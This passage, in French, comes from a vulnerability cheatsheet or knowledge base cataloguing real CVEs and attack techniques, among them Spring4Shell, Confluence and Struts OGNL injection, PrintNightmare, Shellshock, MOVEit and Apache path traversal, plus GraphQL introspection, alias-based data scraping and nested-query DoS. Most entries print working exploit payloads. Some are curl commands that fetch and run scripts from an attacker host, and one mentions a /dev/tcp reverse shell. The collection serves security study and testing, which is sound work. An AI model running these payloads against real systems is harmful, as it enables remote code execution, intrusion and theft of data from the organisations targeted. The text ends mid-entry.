class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7bc2%7di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7b%20java.io.InputStream%20in%20%3d%20%25%7bc1%7di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3b%20int%20a%20%3d%20-1%3b%20byte%5b%5d%20b%20%3d%20new%20byte%5b2048%5d%3b%20while((a%3din.read(b))!%3d-1)%7b%20out.println(new%20String(b))%3b%20%7d%20%7d%20%25%3e
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
Ces paramètres, transmis via le binding automatique de Spring, atteignent Class#getModule().getClassLoader() puis le ClassLoader de Tomcat, dont on réécrit le premier Valve (AccessLogValve) de la Pipeline pour qu'il écrive tout futur log d'accès sous forme d'un fichier tomcatwar*.jsp dans webapps/ROOT. Une requête suivante vers /tomcatwarXXXXX.jsp?pwd=j&cmd=id exécute alors la commande arbitraire.
```

**Techniques :** classloader-manipulation, data-binding-pollution, tomcat-accesslogvalve-webshell, parameter-pollution

**Correspond aux classes qualifiantes :** rce

**Signal (endpoints/fonctions observés) :**
- `Tout endpoint Spring MVC effectuant du data-binding sur un objet Java (@ModelAttribute / @RequestParam sur un POJO)`
- `/ (formulaire arbitraire déployé en WAR sur Tomcat)`

**Paramètres impliqués :** `class.module.classLoader.resources.context.parent.pipeline.first.pattern`, `class.module.classLoader.resources.context.parent.pipeline.first.suffix`, `class.module.classLoader.resources.context.parent.pipeline.first.directory`, `class.module.classLoader.resources.context.parent.pipeline.first.prefix`, `class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat`

---

### CVE-2021-26084 — Injection OGNL RCE dans Atlassian Confluence via l'app Questions for Confluence

**📄 Cas réel**
sévérité : critical · CWE-917

L'application intégrée « Questions for Confluence » enregistre un endpoint qui insère la valeur du paramètre SpaceKey directement dans un contexte OGNL évalué par le moteur WebWork/Struts sous-jacent à Confluence, sans passer par l'échappement habituel du moteur de rendu. Un attaquant non authentifié peut donc injecter une expression OGNL qui, une fois évaluée côté serveur, appelle des classes Java arbitraires (Runtime, ProcessBuilder) pour exécuter des commandes système. La vulnérabilité affecte Confluence Server/Data Center dès que l'app Questions for Confluence est activée (activée par défaut dans certaines versions), et a été massivement exploitée dès sa divulgation en août-septembre 2021.

**Cause racine :** Le paramètre SpaceKey transmis à l'action de création de page est concaténé dans une expression évaluée par le contexte OGNL de la value stack de Struts/WebWork, sans neutralisation des métacaractères OGNL (%, #, {, }).

**Preuve technique (verbatim depuis la source) :**

```
Requête PoC (pré-authentification) largement documentée après la divulgation par Atlassian le 25/08/2021 :
```
POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1
Host: victime
Content-Type: application/x-www-form-urlencoded

queryString=aaa%27%2B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%23q%3D%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.getWriter%28%29%29.%28%23q.print%28%23a%29%29.%28%23q.close%28%29%29%2B%27
```
La valeur de SpaceKey, réinjectée sans échappement dans le contexte OGNL de la value stack, permet d'accéder à @java.lang.Runtime@getRuntime().exec(...) pour exécuter une commande, dont la sortie est écrite directement dans la réponse HTTP via le ServletActionContext, confirmant l'exécution de code à distance pré-authentifiée.
```

**Techniques :** ognl-injection, velocity-template-injection, pre-auth-rce

**Correspond aux classes qualifiantes :** rce, ssti

**Signal (endpoints/fonctions observés) :**
- `/pages/createpage-entervariables.action`
- `/pages/doenterpagevariables.action`

**Paramètres impliqués :** `SpaceKey`, `queryString`

---

### PrintNightmare (CVE-2021-34527) — RCE dans le service Spouleur d'impression Windows via RpcAddPrinterDriverEx

**📄 Cas réel**
sévérité : critical · CWE-269

Le service Spouleur d'impression Windows expose via RPC la fonction RpcAddPrinterDriverEx (MS-RPRN), censée permettre l'installation de pilotes d'imprimante signés par un administrateur. Une vérification de contrôle d'accès insuffisante permet à un utilisateur authentifié à faibles privilèges (voire à un attaquant distant via une session SMB) de pointer vers un pilote non signé hébergé sur un partage SMB qu'il contrôle, et de forcer le service Spouleur — qui tourne en SYSTEM — à charger ce pilote sous forme de DLL. Le code du pilote s'exécute alors avec les privilèges SYSTEM, donnant une élévation de privilèges locale ou une RCE distante lorsque le Spouleur est accessible sur le réseau (partage d'imprimante, contrôleur de domaine).

**Cause racine :** RpcAddPrinterDriverEx ne valide pas correctement que l'appelant dispose du privilège SeLoadDriverPrivilege ni que le pilote fourni est signé, permettant le chargement d'une DLL arbitraire par le service Spouleur exécuté en SYSTEM.

**Preuve technique (verbatim depuis la source) :**

```
Exploitation combinée à la découverte préalable (Point and Print + printerbug) documentée par cube0x0 et Zhiniang Peng/Xuefeng Li (Sangfor) :
```
# 1. Héberger le pilote malveillant sur un partage SMB contrôlé par l'attaquant
impacket-smbserver share ./sharefolder -smb2support

# 2. Déclencher RpcAddPrinterDriverEx sur la cible pour charger le pilote distant
python3 CVE-2021-1675.py contoso.local/user:'Password123'@10.10.10.10 -hostname 10.10.10.10 -dll-path '\\10.10.10.5\share\evil.dll'
```
La cible, en tant que service Spouleur SYSTEM, se connecte au partage SMB de l'attaquant, télécharge evil.dll et l'exécute dans son propre contexte, donnant un shell SYSTEM sur la machine distante ou une élévation de privilèges locale sur un poste où l'attaquant dispose déjà d'un accès utilisateur standard.
```

**Techniques :** rpc-abuse, malicious-print-driver-load, smb-share-driver-staging, privilege-escalation-to-system

**Correspond aux classes qualifiantes :** rce, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `Interface RPC MS-RPRN (\\pipe\\spoolss)`
- `\\<cible>\PIPE\spoolss`

**Paramètres impliqués :** `pDriverPath`, `pDataFile`, `pConfigFile`, `cbBuf`

---

### CVE-2017-5638 — RCE OGNL via l'en-tête Content-Type dans Apache Struts2 (breach Equifax)

**📄 Cas réel**
sévérité : critical · CWE-20

Le parseur Jakarta Multipart de Struts2, utilisé pour traiter les requêtes multipart/form-data (uploads de fichiers), gère mal les exceptions levées lors de l'analyse de l'en-tête Content-Type malformé : le message d'exception, contenant l'en-tête brut, est réévalué comme une expression OGNL par le framework. Un attaquant peut donc injecter une expression OGNL directement dans l'en-tête Content-Type d'une requête HTTP, sans authentification, pour exécuter des commandes système sur le serveur. Cette faille est celle exploitée dans la brèche Equifax de 2017 (données de 147 millions de personnes).

**Cause racine :** Le message d'erreur généré lors de l'échec de parsing du Content-Type par Jakarta Multipart est passé à la couche de traduction OGNL de Struts sans neutralisation des métacaractères OGNL.

**Preuve technique (verbatim depuis la source) :**

```
Payload PoC S2-045, largement republié après la divulgation de mars 2017 :
```
POST /doUpload.action HTTP/1.1
Host: victime
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

[corps multipart minimal]
```
L'échec du parsing de ce Content-Type malformé déclenche une exception dont le message (contenant l'expression OGNL) est réinterprété par le moteur, désactivant la protection DEFAULT_MEMBER_ACCESS puis exécutant la commande `id` via ProcessBuilder, dont la sortie est écrite directement dans la réponse HTTP.
```

**Techniques :** ognl-injection, multipart-parser-abuse, header-based-rce

**Correspond aux classes qualifiantes :** rce

**Signal (endpoints/fonctions observés) :**
- `Tout endpoint Struts2 utilisant le parseur Jakarta Multipart (*.action avec upload de fichier)`

**Paramètres impliqués :** `Content-Type`

---

### CVE-2019-11510 — Lecture de fichier arbitraire pré-auth menant à RCE sur Pulse Connect Secure

**📄 Cas réel**
sévérité : critical · CWE-22

Pulse Connect Secure (VPN SSL) ne valide pas correctement les séquences de traversée de répertoire dans les URI pointant vers des ressources statiques de l'interface web « dana-na », permettant à un attaquant non authentifié de lire n'importe quel fichier du système (/etc/passwd, mais surtout le cache de sessions contenant identifiants et cookies en clair). Une fois des identifiants ou une session administrateur volés, l'attaquant peut atteindre les pages de diagnostic administrateur, vulnérables à une injection de commande (CVE-2019-11539), complétant la chaîne en RCE totale sur l'appliance. Cette chaîne a été activement exploitée par des groupes APT dès 2019-2020 et documentée dans plusieurs alertes CISA.

**Cause racine :** Le module dana-na de l'interface web ne normalise pas les composants ../ dans le chemin de requête avant de résoudre le fichier statique demandé, permettant l'évasion de la racine web autorisée.

**Preuve technique (verbatim depuis la source) :**

```
Payload de traversée de répertoire divulgué par Orange Tsai / Meh Chang (DEVCORE, Black Hat 2019) :
```
curl -k "https://vpn.victime.com/dana-na/../dana/html5acc/guacamole/../../../../etc/passwd?/dana/html5acc/guacamole/"
```
En ciblant à la place le fichier de cache de session (contenant identifiants LDAP/AD en clair et cookies DSID actifs), l'attaquant obtient un accès direct à des sessions déjà authentifiées, y compris administrateur. Avec une session admin volée, la chaîne se termine par une injection de commande pré-authentifiée dans les pages de diagnostic (CVE-2019-11539), par exemple via le paramètre de test de connectivité réseau, exécutée avec les privilèges root de l'appliance, complétant la RCE.
```

**Techniques :** path-traversal, session-cache-theft, credential-theft, chained-admin-command-injection

**Correspond aux classes qualifiantes :** path-traversal, rce, account-takeover

**Signal (endpoints/fonctions observés) :**
- `/dana-na/../dana/html5acc/guacamole/../../../../etc/passwd?/dana/html5acc/guacamole/`
- `/dana-na/`
- `/dana/html5acc/guacamole/`

**Paramètres impliqués :** `chemin URI (traversal)`

---

### Ghostcat (CVE-2020-1938) — Lecture/inclusion de fichier via le protocole AJP dans Apache Tomcat

**📄 Cas réel**
sévérité : high · CWE-22

Le connecteur AJP de Tomcat, activé et exposé par défaut sur le port 8009, fait confiance aux attributs de requête forgés par le client (considéré comme un reverse-proxy de confiance) sans authentification. Un attaquant capable d'atteindre ce port peut forger une requête AJP brute définissant les attributs javax.servlet.include.request_uri et path_info pour forcer Tomcat à inclure et retourner le contenu de n'importe quel fichier de l'application, y compris WEB-INF/web.xml (source, credentials de datasource). Si l'application permet par ailleurs l'upload de fichiers arbitraires, le même mécanisme d'inclusion permet d'exécuter du JSP uploadé, transformant la LFI en RCE.

**Cause racine :** Le connecteur AJP considère par défaut toute machine capable d'établir une connexion TCP sur le port 8009 comme un proxy de confiance, sans authentification ni restriction sur les attributs de requête qu'elle peut définir (dont l'inclusion de ressources internes).

**Preuve technique (verbatim depuis la source) :**

```
Exploitation via l'outil ajpShooter (ou le module Metasploit `tomcat_ghostcat`) publié après la divulgation en février 2020 :
```
python3 ajpShooter.py http://victime 8009 /WEB-INF/web.xml read
```
Cette requête AJP forgée définit req_attribute javax.servlet.include.request_uri=/WEB-INF/web.xml et javax.servlet.include.path_info, contournant la protection normale qui empêche l'accès direct à WEB-INF via HTTP, et renvoie le contenu du descripteur de déploiement (mappings, servlets, parfois secrets). Si l'application héberge une fonctionnalité d'upload de fichier (même sans exécution directe), le même vecteur permet de forcer l'inclusion du fichier uploadé comme JSP :
```
python3 ajpShooter.py http://victime 8009 /uploads/shell.jpg include
```
aboutissant à l'exécution du code JSP contenu dans le fichier uploadé, donc à une RCE complète.
```

**Techniques :** ajp-request-forgery, arbitrary-file-read, file-inclusion-to-rce

**Correspond aux classes qualifiantes :** lfi, rce

**Signal (endpoints/fonctions observés) :**
- `Connecteur AJP/1.3 sur TCP/8009 (activé par défaut dans Tomcat < 9.0.31/8.5.51/7.0.100)`

**Paramètres impliqués :** `javax.servlet.include.request_uri`, `javax.servlet.include.path_info`, `req_attribute`

---

### CVE-2022-26134 — Injection OGNL pré-authentifiée RCE dans Atlassian Confluence Server et Data Center

**📄 Cas réel**
sévérité : critical · CWE-917

Confluence Server et Data Center résolvent le namespace XWork d'une action à partir d'un segment du chemin de l'URI, puis réinjectent ce namespace dans la value stack OGNL lors du rendu de certaines pages d'erreur/redirection. En plaçant une expression ${...} directement dans le chemin de la requête (sans authentification), un attaquant force son évaluation par le moteur OGNL du framework WebWork sous-jacent. La restriction DEFAULT_MEMBER_ACCESS empêchant l'appel direct à Runtime.exec a été contournée en passant par javax.script.ScriptEngineManager pour évaluer du JavaScript Nashorn, qui lui-même invoque ProcessBuilder. Cette vulnérabilité, exploitée en masse dès juin 2022 (0-day), donne une RCE pré-authentifiée complète.

**Cause racine :** Le namespace extrait du chemin de l'URI est utilisé sans échappement pour construire une valeur évaluée par le contexte OGNL de la value stack XWork, permettant l'exécution d'expressions arbitraires avant toute authentification.

**Preuve technique (verbatim depuis la source) :**

```
Payload PoC publié après la divulgation du 0-day (Volexity, juin 2022) :
```
curl -s 'http://victime:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22js%22%29.eval%28%22new%20java.lang.ProcessBuilder%28java.util.Arrays.asList%28%27bash%27%2C%27-c%27%2C%27curl%20http%3A%2F%2Fattaquant%2Frce%27%29%29.start%28%29%22%29%7D/'
```
Le segment ${...} du chemin, une fois résolu comme namespace XWork puis évalué par OGNL, instancie un ScriptEngineManager Nashorn pour exécuter du JavaScript qui lui-même construit un ProcessBuilder et lance la commande — ce détour par le moteur de script contourne la liste noire de classes Java bloquant l'appel direct à Runtime/ProcessBuilder depuis OGNL.
```

**Techniques :** ognl-injection, pre-auth-rce, url-path-ognl-evaluation, script-engine-workaround

**Correspond aux classes qualifiantes :** rce, ssti

**Signal (endpoints/fonctions observés) :**
- `/${...}/ (namespace d'URI arbitraire évalué comme expression OGNL)`
- `/%24%7B...%7D/`

**Paramètres impliqués :** `namespace d'URI`

---

### CVE-2021-21985 — RCE non authentifiée dans le plug-in vSAN Health Check de VMware vCenter Server

**📄 Cas réel**
sévérité : critical · CWE-502

Le plug-in vSAN Health Check, activé par défaut dans vCenter Server (même sur des déploiements sans vSAN), expose un servlet d'upload accessible sans authentification sur l'interface vSphere Client. Ce servlet désérialise directement les données binaires reçues sans validation de type, permettant à un attaquant distant d'envoyer un objet Java sérialisé malveillant exploitant une chaîne de gadgets (ex. Commons-Collections/Commons-Beanutils présents dans le classpath de vCenter) pour exécuter du code arbitraire avec les privilèges du service vCenter. La faille a été largement exploitée après la publication de PoC publics en 2021.

**Cause racine :** Le servlet du plug-in vSAN Health Check accepte et désérialise des objets Java binaires envoyés par un client non authentifié sans liste blanche de classes autorisées.

**Preuve technique (verbatim depuis la source) :**

```
Chaîne d'exploitation documentée dans les avis VMSA-2021-0010 et les analyses publiques associées :
```
# 1. Générer un objet sérialisé malveillant avec une chaîne de gadgets présente dans vCenter
java -jar ysoserial.jar CommonsBeanutils1 'curl http://attaquant/rce.sh|bash' > payload.ser

# 2. Envoyer l'objet sérialisé au servlet d'upload non authentifié du plug-in vSAN Health Check
curl -k -X POST 'https://vcenter.victime.local/ui/vsanHealthCheckUploadServlet' \
  -F 'uploadFile=@payload.ser;type=application/octet-stream'
```
Le servlet désérialise le flux reçu sans vérifier son origine ni son type, instanciant la chaîne de gadgets qui invoque en cascade des méthodes jusqu'à un Runtime.exec final, exécutant la commande de l'attaquant avec les privilèges du service vCenter (généralement SYSTEM ou root selon la plateforme).
```

**Techniques :** insecure-deserialization, ysoserial-gadget-chain, unauthenticated-plugin-servlet

**Correspond aux classes qualifiantes :** rce, deserialization

**Signal (endpoints/fonctions observés) :**
- `/ui/vsanHealthCheckUploadServlet`

**Paramètres impliqués :** `uploadFile`

---

### CVE-2023-34362 — Injection SQL dans MOVEit Transfer menant au dépôt d'un webshell RCE (campagne Cl0p)

**📄 Cas réel**
sévérité : critical · CWE-89

L'application web MOVEit Transfer construit certaines requêtes SQL en concaténant des valeurs transmises via des en-têtes et paramètres HTTP (notamment X-siLock-Comment) sans les paramétrer correctement, permettant une injection SQL non authentifiée sur la base de données back-end. Le gang Cl0p a exploité cette injection en masse (mai 2023) pour énumérer le schéma, injecter un compte/jeton d'API arbitraire, puis utiliser l'API légitime de MOVEit ainsi obtenue pour déposer un webshell ASPX (connu sous le nom human2.aspx) directement dans le répertoire wwwroot de l'application, obtenant l'exécution de commandes et l'exfiltration de fichiers hébergés par des centaines d'organisations victimes.

**Cause racine :** Les requêtes SQL de MOVEit Transfer construites à partir d'en-têtes/paramètres HTTP (dont X-siLock-Comment) ne sont pas paramétrées, permettant l'injection de requêtes SQL arbitraires côté serveur sans authentification préalable.

**Preuve technique (verbatim depuis la source) :**

```
Chaîne documentée par Mandiant/Huntress/Rapid7 lors de la réponse à incident Cl0p (mai-juin 2023) :
```
POST /human.aspx HTTP/1.1
Host: victime
X-siLock-Comment: 1;waitfor delay '0:0:5'--
```
utilisée d'abord pour confirmer l'injection SQL aveugle par délai, puis pour énumérer les tables via des requêtes empilées et créer un compte disposant d'un jeton d'API valide. Ce jeton est ensuite utilisé pour appeler l'API légitime de MOVEit et déposer un fichier ASPX malveillant (human2.aspx) directement dans wwwroot, déguisé en fichier applicatif natif. Ce webshell, protégé par un en-tête custom (X-siLock-Comment servant cette fois de mot de passe), accepte des commandes arbitraires et permet l'exfiltration de tous les fichiers transitant par l'appliance, ainsi que l'exécution de commandes système.
```

**Techniques :** sql-injection, blind-sqli, webshell-upload, stacked-queries

**Correspond aux classes qualifiantes :** sqli, rce

**Signal (endpoints/fonctions observés) :**
- `/moveitisapi/moveitisapi.dll`
- `/human.aspx`
- `/api/v1/folders`

**Paramètres impliqués :** `X-siLock-Comment`, `ID`, `folderID`

---

### Shellshock (CVE-2014-6271) — RCE par injection dans le parsing des fonctions Bash via CGI

**📄 Cas réel**
sévérité : critical · CWE-78

Bash, lorsqu'il importe des fonctions exportées via des variables d'environnement (mécanisme utilisé notamment par les scripts CGI, qui transmettent les en-têtes HTTP client sous forme de variables d'environnement), continue à interpréter et exécuter tout code placé après la fin de la définition de fonction syntaxique `() { :; };`. Un attaquant peut ainsi placer une commande arbitraire dans un en-tête HTTP (User-Agent, Referer, Cookie) transmis à un script CGI invoquant Bash : celle-ci sera exécutée par le shell au démarrage du processus CGI, avant même l'exécution du script lui-même, donnant une RCE pré-authentifiée sur tout serveur exposant du CGI/mod_cgi avec Bash comme interpréteur système.

**Cause racine :** Le parseur de fonctions exportées de Bash ne s'arrête pas à la fin de la définition de fonction `() { :; };` et continue à interpréter/exécuter le texte suivant dans la même variable d'environnement comme des commandes shell.

**Preuve technique (verbatim depuis la source) :**

```
PoC classique publié dès la divulgation (septembre 2014), exploitant un script CGI (ex. /cgi-bin/status) qui invoque Bash :
```
curl -H 'User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd' http://victime/cgi-bin/status
```
La variable d'environnement HTTP_USER_AGENT, positionnée par le serveur web avec le contenu de l'en-tête, contient une définition de fonction suivie de commandes arbitraires. Au démarrage du sous-processus Bash pour exécuter le CGI, celui-ci exécute la commande injectée (`/bin/cat /etc/passwd`) et renvoie sa sortie directement dans la réponse HTTP, avant même d'exécuter le script CGI ciblé. Des variantes plus offensives utilisaient un reverse shell (`/bin/bash -i >& /dev/tcp/attaquant/4444 0>&1`) à la place du simple cat.
```

**Techniques :** command-injection, cgi-env-variable-abuse, bash-function-export-parsing-bug

**Correspond aux classes qualifiantes :** rce

**Signal (endpoints/fonctions observés) :**
- `/cgi-bin/*`

**Paramètres impliqués :** `User-Agent`, `Referer`, `Cookie`, `variables d'environnement CGI`

---

### CVE-2021-41773 / CVE-2021-42013 — Traversée de chemin et RCE via CGI dans Apache HTTP Server 2.4.49/2.4.50

**📄 Cas réel**
sévérité : critical · CWE-22

La réécriture du normaliseur de chemins d'Apache HTTP Server 2.4.49 a introduit une régression permettant de contourner la protection contre la traversée de répertoire en préfixant chaque segment ../ par un point additionnel encodé (.%2e/), révélant les fichiers en dehors de la racine documentaire (ex. /etc/passwd) et, si mod_cgi est activé, permettant l'exécution de commandes en pointant la traversée vers un interpréteur système (/bin/sh). Le correctif initial (2.4.50) était incomplet : un double encodage des caractères (%%32%65 pour un « . » doublement encodé) permettait de recontourner la validation, ce qui a été suivi par CVE-2021-42013 corrigé en 2.4.51.

**Cause racine :** La fonction de normalisation de chemin ap_normalize_path traite les séquences comme .%2e (point suivi d'un point encodé) de façon incohérente entre la phase de décodage et la phase de vérification anti-traversal, laissant passer des chemins censés être bloqués.

**Preuve technique (verbatim depuis la source) :**

```
PoC de lecture de fichier (CVE-2021-41773, Apache 2.4.49) :
```
curl --path-as-is http://victime/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
PoC de RCE si mod_cgi est activé :
```
curl --path-as-is -d 'echo Content-Type: text/plain; echo; id' 'http://victime/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
```
PoC du contournement du correctif incomplet en 2.4.50 (CVE-2021-42013, double encodage) :
```
curl --path-as-is -d 'echo Content-Type: text/plain; echo; id' 'http://victime/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
```
Dans les deux cas, la traversée de répertoire échappe à htdocs/cgi-bin pour atteindre /bin/sh, que mod_cgi invoque alors comme interpréteur du script « CGI », exécutant la commande fournie dans le corps de la requête (ici `id`) et renvoyant sa sortie dans la réponse HTTP.
```

**Techniques :** path-traversal, url-encoding-bypass, cgi-rce, incomplete-patch-bypass

**Correspond aux classes qualifiantes :** path-traversal, rce

**Signal (endpoints/fonctions observés) :**
- `/cgi-bin/.%2e/`
- `/icons/.%2e/`
- `/cgi-bin/.%%32%65/`

**Paramètres impliqués :** `chemin URI (séquences de traversée encodées)`

---

## Denial of Service

*1 cas.*

### CVE-2026-11586: WS Auto-PONG memory exhaustion

**📄 Cas réel**
[source](https://hackerone.com/reports/3788931)

curl auto-replies to every WebSocket PING frame with a PONG (unless CURLWS_NOAUTOPONG is set), queuing generated PONGs in a buffer with only a soft limit, no effective hard cap. A malicious WebSocket peer can complete a valid upgrade, stop reading client data, and continuously send legal PING frames to force unbounded memory growth on the client until timeout or OOM — the PoC reached ~1 GiB RSS in ~2 seconds.

**Cause racine :** The auto-PONG queuing path has no effective hard limit, letting a remote peer force unbounded memory growth by sending PINGs without reading responses.

**Preuve technique (verbatim depuis la source) :**

```
Root cause (lib/ws.c): auto-PONG queuing has no effective hard cap.
if(!ws->enc.payload_remain) {
  CURLcode result = ws_enc_add_pending(data, ws);
  if(!result) (void)ws_flush(data, ws, Curl_is_in_callback(data));
  return result;
}
Curl_bufq_init2(&ws->sendbuf, chunk_size, WS_CHUNK_COUNT, BUFQ_OPT_SOFT_LIMIT);  // soft limit only

Self-contained Python PoC (malicious WS server completes the handshake, then floods legal PING frames while never reading client data):
f = b"\x89\x00" * 65536  # a PING frame (opcode 0x89, empty payload) repeated
try:
    while True:
        c.sendall(f)
except OSError:
    pass
# client invocation, RLIMIT_AS capped to 180MiB to force a deterministic OOM exit:
subprocess.run([CURL_BIN, "--silent", "--show-error", "--max-time", "8", f"ws://127.0.0.1:{port}/"],
  preexec_fn=lambda: resource.setrlimit(resource.RLIMIT_AS, (188743680, 188743680)))
# Expected: curl: (27) Out of memory / rc=27. Uncapped runs hit ~1 GiB RSS in ~2 seconds.
Mitigation confirmed effective: CURLWS_NOAUTOPONG (CURLOPT_WS_OPTIONS) avoids the vulnerable path entirely; smaller --max-time only shrinks the damage window, doesn't add backpressure.
```

**Techniques :** unbounded-queue-growth, protocol-abuse, resource-exhaustion, differential-testing

**Correspond aux classes qualifiantes :** protocol-vulnerability

**Signal (endpoints/fonctions observés) :**
- `lib/ws.c`
- `ws_enc_add_cntrl()`
- `ws_flush()`

**Paramètres impliqués :** `CURLWS_NOAUTOPONG`, `CURLOPT_WS_OPTIONS`

---

## GraphQL — Introspection, Batching, DoS

*11 cas.*

### Introspection GraphQL laissée active en production — cartographie complète du schéma

**🧾 Cheatsheet**
sévérité : medium · CWE-200

L'introspection GraphQL (activée par défaut dans la plupart des frameworks en dev, souvent oubliée en prod) permet de récupérer la totalité du schéma -- tous les types, tous les champs, toutes les mutations, y compris celles jamais utilisées par le frontend officiel mais toujours actives côté serveur (fonctionnalités admin, debug, legacy). C'est systématiquement la première requête à envoyer sur toute cible GraphQL : elle remplace des heures de reverse engineering du frontend par une seule requête.

**Cause racine :** L'introspection GraphQL (`__schema`) n'est pas désactivée en production, exposant la totalité de la surface d'API y compris les mutations non documentées/non utilisées par le client officiel.

**Preuve technique (verbatim depuis la source) :**

```
Requête d'introspection complète standard :
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } } } fragment FullType on __Type { kind name fields(includeDeprecated: true) { name args { ...InputValue } type { ...TypeRef } } } fragment InputValue on __InputValue { name type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name } }"}

Version courte pour juste lister les mutations disponibles (souvent la partie la plus intéressante) :
{"query":"{ __schema { mutationType { fields { name } } } }"}

Outils pour exploiter le résultat : InQL (extension Burp, génère une UI de requêtes depuis le schéma), GraphQL Voyager (visualisation graphique des relations entre types).
```

**Techniques :** introspection-query, schema-enumeration, graphql-voyager-visualization

**Correspond aux classes qualifiantes :** graphql

**Signal (endpoints/fonctions observés) :**
- `POST /graphql`

**Paramètres impliqués :** `query`

---

### Reconstruire un schéma GraphQL sans introspection via l'oracle des suggestions de champs

**🧾 Cheatsheet**
sévérité : low · CWE-200

Même avec l'introspection désactivée, la plupart des serveurs GraphQL (comportement par défaut de graphql-js et dérivés) renvoient une erreur 'suggestion' quand un champ n'existe pas mais qu'un champ au nom proche existe : `Cannot query field \"usernam\" on type \"User\". Did you mean \"username\"?`. En envoyant systématiquement des noms de champs candidats (dictionnaire de mots courants + variations), on reconstruit le schéma complet champ par champ malgré l'introspection coupée.

**Cause racine :** Le serveur GraphQL renvoie des suggestions de correction ('Did you mean ...?') basées sur la distance de Levenshtein avec les VRAIS noms de champs du schéma, même quand l'introspection formelle est désactivée -- fuite d'information par canal auxiliaire.

**Preuve technique (verbatim depuis la source) :**

```
Outil dédié : Clairvoyance (https://github.com/nikitastupin/clairvoyance) automatise exactement ce brute-force par oracle de suggestion.
Requête manuelle de test (deviner un champ probable pour déclencher la suggestion) :
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{ user { usernam } }"}

Réponse typique révélant le vrai nom :
{"errors":[{"message":"Cannot query field \"usernam\" on type \"User\". Did you mean \"username\"?"}]}
Répéter avec un dictionnaire de champs candidats (id, email, role, isAdmin, permissions, apiKey, ssn...) pour chaque type découvert.
```

**Techniques :** field-suggestion-oracle, graphql-schema-reconstruction, clairvoyance-tool

**Correspond aux classes qualifiantes :** graphql

**Signal (endpoints/fonctions observés) :**
- `POST /graphql`

**Paramètres impliqués :** `query`

---

### IDOR/BOLA via les alias GraphQL pour requêter plusieurs objets en un seul appel

**🧾 Cheatsheet**
sévérité : high · CWE-639

Si un resolver `user(id: ID!)` ne vérifie pas que l'ID demandé appartient bien à l'appelant (BOLA classique), GraphQL permet d'exploiter ça À GRANDE ÉCHELLE en une seule requête HTTP grâce aux alias : demander le MÊME champ `user` avec des `id` DIFFÉRENTS, chacun sous un alias distinct, dans une seule query -- contournant au passage un rate-limiting naïf basé sur le nombre de requêtes HTTP plutôt que sur le nombre d'objets réellement résolus.

**Cause racine :** Le resolver `user(id)` ne vérifie l'autorisation que sur l'ID du token de session, pas sur l'ID demandé en paramètre, et le rate-limiting compte les requêtes HTTP au lieu des opérations de résolution internes.

**Preuve technique (verbatim depuis la source) :**

```
Une seule requête HTTP qui exfiltre 5 profils utilisateurs arbitraires via des alias :
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{ u1: user(id: \"1001\") { email ssn } u2: user(id: \"1002\") { email ssn } u3: user(id: \"1003\") { email ssn } u4: user(id: \"1004\") { email ssn } u5: user(id: \"1005\") { email ssn } }"}

Réponse (si vulnérable) : un objet JSON avec u1..u5 contenant chacun les données PII d'un utilisateur différent -- extensible à des centaines d'alias par requête pour un scraping massif indétectable par un WAF qui compte les requêtes/seconde.
```

**Techniques :** graphql-aliasing, bola-batch-enumeration

**Correspond aux classes qualifiantes :** graphql, bola, idor

**Signal (endpoints/fonctions observés) :**
- `POST /graphql`

**Paramètres impliqués :** `query`

---

### Déni de service par requête GraphQL récursive profondément imbriquée

**🧾 Cheatsheet**
sévérité : high · CWE-674

Quand un schéma expose des relations circulaires (ex: `User.friends { User.friends { User.friends {...} } }` ou `Post.comments.author.posts.comments...`), une query qui imbrique cette relation des dizaines de fois force le serveur à résoudre un nombre de champs exponentiel (N^profondeur), pouvant épuiser CPU/mémoire/connexions DB avec une seule requête de quelques centaines d'octets -- si aucune limite de profondeur (`maxDepth`) ni de complexité de requête n'est appliquée server-side.

**Cause racine :** Absence de limite de profondeur de requête (query depth limiting) ou d'analyse de complexité (query cost analysis) côté serveur GraphQL, laissant un client construire une requête dont le coût de résolution croît exponentiellement.

**Preuve technique (verbatim depuis la source) :**

```
Payload de query profondément imbriquée (générée par script pour une profondeur configurable, ici extrait à profondeur 10 sur une relation friends/posts circulaire) :
